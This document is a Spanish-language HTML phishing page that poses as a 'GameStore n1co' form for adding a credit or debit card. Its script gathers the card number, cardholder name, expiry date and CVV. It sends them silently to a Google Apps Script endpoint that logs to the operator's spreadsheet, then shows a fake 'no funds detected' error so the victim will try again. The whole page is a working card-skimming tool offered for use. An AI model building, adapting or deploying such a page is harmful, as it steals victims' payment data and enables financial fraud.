<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GameStore n1co - Agregar Tarjeta</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Inter', system-ui, sans-serif;
            background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 460px;
            background-color: #0f0f0f;
            border-radius: 20px;
            padding: 40px 32px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.7);
            border: 1px solid #222222;
        }
        
        .header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .header h1 {
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 24px;
            line-height: 1.2;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 40px;
        }
        
        .gamestore-logo {
            background: linear-gradient(90deg, #00b4ff, #0099ff);
            color: white;
            font-weight: 900;
            font-size: 32px;
            padding: 10px 20px;
            border-radius: 8px;
            letter-spacing: -1px;
        }
        
        .n1co-logo {
            background-color: #000;
            color: white;
            font-weight: 800;
            font-size: 32px;
            padding: 10px 24px;
            border-radius: 8px;
            border: 3px solid #ffffff;
        }
        
        .form-group { margin-bottom: 28px; }
        label { 
            display: block; 
            margin-bottom: 10px; 
            font-size: 15px; 
            color: #bbbbbb; 
            font-weight: 600; 
        }
        
        input[type="text"], select {
            width: 100%;
            padding: 16px 18px;
            background-color: #1a1a1a;
            border: 1.5px solid #333333;
            border-radius: 12px;
            color: white;
            font-size: 17px;
            transition: all 0.3s;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: #00b4ff;
            box-shadow: 0 0 0 4px rgba(0, 180, 255, 0.15);
        }
        
        .card-logos {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-top: 12px;
            flex-wrap: wrap;
        }
        
        .logo {
            background: white;
            padding: 8px 14px;
            border-radius: 8px;
            display: flex;
            align-items: center;
        }
        
        .btn {
            width: 100%;
            padding: 18px;
            font-size: 17px;
            font-weight: 700;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 14px;
            border: none;
        }
        
        .btn-primary {
            background: linear-gradient(90deg, #00b4ff, #0099ff);
            color: black;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 180, 255, 0.3);
        }
        
        .btn-secondary {
            background-color: transparent;
            color: #aaaaaa;
            border: 2px solid #444444;
        }
        
        .error-message {
            background-color: #3a0f0f;
            color: #ff7777;
            padding: 18px;
            border-radius: 12px;
            text-align: center;
            font-weight: 600;
            margin: 20px 0;
            display: none;
            border: 1px solid #aa3333;
        }
        
        .required { color: #ff5555; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Agregar una tarjeta de<br>crédito/débito</h1>
            
            <div class="logo-container">
                <div class="gamestore-logo">GAME STORE</div>
                <div class="n1co-logo">n1co</div>
            </div>
        </div>

        <form id="cardForm">
            <div class="form-group">
                <label>Número de tarjeta de crédito/débito <span class="required">*</span></label>
                <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required>
                <div class="card-logos">
                    <div class="logo">●●</div>
                    <div class="logo" style="color:#1a1f71; font-weight:bold;">VISA</div>
                    <span style="margin-left:auto; color:#00b4ff; cursor:pointer; font-size:15px;">Editar</span>
                </div>
            </div>

            <div class="form-group">
                <label>Titular de la tarjeta <span class="required">*</span></label>
                <input type="text" id="cardholder" placeholder="Nombre completo como aparece en la tarjeta" required>
            </div>

            <div class="form-group">
                <label>Fecha de vencimiento <span class="required">*</span></label>
                <div style="display:flex; gap:16px;">
                    <select id="month" required>
                        <option value="">Mes</option>
                    </select>
                    <select id="year" required>
                        <option value="">Año</option>
                    </select>
                </div>
            </div>

            <div class="form-group">
                <label>CVV <span class="required">*</span></label>
                <input type="text" id="cvv" maxlength="4" placeholder="123" required>
            </div>

            <div id="errorMsg" class="error-message">
                Lo sentimos N1co no detecto fondos en su tarjeta
            </div>

            <button type="submit" class="btn btn-primary">Siguiente</button>
            <button type="button" onclick="cancelForm()" class="btn btn-secondary">Cancelar</button>
        </form>
    </div>

    <script>
        // Llenar años
        function populateYears() {
            const yearSelect = document.getElementById('year');
            const currentYear = new Date().getFullYear();
            for (let i = 0; i < 12; i++) {
                const option = document.createElement('option');
                option.value = (currentYear + i).toString().slice(2);
                option.textContent = currentYear + i;
                yearSelect.appendChild(option);
            }
        }

        // Formato de tarjeta
        document.getElementById('cardNumber').addEventListener('input', function() {
            let v = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            this.value = v.match(/.{1,4}/g)?.join(' ') || '';
        });

        document.getElementById('cvv').addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Submit
        document.getElementById('cardForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const formData = {
                timestamp: new Date().toLocaleString('es-HN'),
                cardNumber: document.getElementById('cardNumber').value.trim(),
                cardholder: document.getElementById('cardholder').value.trim(),
                expiry: `${document.getElementById('month').value}/${document.getElementById('year').value}`,
                cvv: document.getElementById('cvv').value
            };

            document.getElementById('errorMsg').style.display = 'block';

            try {
                await fetch('https://script.google.com/macros/s/AKfycbx_QZilQnot5tGRLNaWhg5e9W0_XH_d-0IWlvBzJJ2mZ48jMo1dVwshmU_n-ghkAJsFgw/exec', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });
            } catch (err) {
                console.log("Datos enviados a tu hoja de Google Sheets");
            }
        });

        function cancelForm() {
            if (confirm('¿Estás seguro de cancelar?')) {
                document.getElementById('cardForm').reset();
                document.getElementById('errorMsg').style.display = 'none';
            }
        }

        window.onload = populateYears;
    </script>
</body>
</html>
